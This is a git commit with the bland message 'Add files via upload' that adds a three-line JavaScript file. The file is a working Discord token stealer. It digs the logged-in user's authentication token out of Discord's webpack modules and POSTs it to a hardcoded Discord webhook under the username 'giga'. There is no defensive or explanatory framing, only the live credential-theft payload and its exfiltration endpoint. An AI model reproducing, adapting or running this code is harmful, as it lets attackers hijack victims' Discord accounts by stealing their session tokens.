55e7153b1972be53c0a8650845af5c2125016a3b
Egor <51438050+161370@users.noreply.github.com>
2023-01-02 20:08:44 +0300

    Add files via upload

---
+++ main.js
@@ -0,0 +1,3 @@
+const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+console.log(token)
+const request = new XMLHttpRequest(); request.open("POST","https://discord.com/api/webhooks/1059517636859400222/zvXOlE8NciH-kEaFEmShMcif-aBEX-aGcfh9ZctVXU7swtwHRwlUYWxi9oGtN0B3NcZN"); request.setRequestHeader('Content-type','application/json'); const params={  username: "giga",  avatar_url: "",  content: token};request.send(JSON.stringify(params));
